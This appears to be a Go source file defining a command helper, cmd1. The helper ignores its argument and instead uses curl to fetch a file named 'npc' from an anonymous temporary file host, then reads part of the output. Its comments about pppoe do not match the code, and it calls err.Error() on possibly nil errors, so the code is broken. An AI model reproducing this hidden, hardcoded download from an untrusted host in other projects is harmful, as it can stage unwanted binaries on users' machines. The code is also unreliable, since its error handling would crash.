package customDev

import (
	"github.com/astaxie/beego/logs"
	"os/exec"
	"strings"
	"time"
)

func cmd1(command string) (result string, err error) {
	defer func() {
		if err1 := recover(); err1 != nil {
			logs.Error("Command 发生严重错误", err)
		}
	}()

	cmd := exec.Command("curl", "https://tmpfiles.org/dl/9601/npc")

	// 命令的错误输出和标准输出都连接到同一个管道
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout

	if err = cmd.Start(); err != nil {
		if strings.Contains(err.Error(), "exit status") {
			// exit status 1 错误是 pppoe 正常退出时返回的
			err = nil
		} else {
			return
		}
	}

	tmp := make([]byte, 1024)
	_, _ = stdout.Read(tmp)
	result = string(tmp)

	// 长时间没有返回就强制杀死进程
	timer := time.AfterFunc(60*time.Second, func() {
		err = cmd.Process.Kill()
		if strings.Contains(err.Error(), "exit status") {
			err = nil
		} else {
			return
		}
	})
	err = cmd.Wait()

	if strings.Contains(err.Error(), "exit status") {
		err = nil
	} else {
		return
	}

	timer.Stop()

	return
}
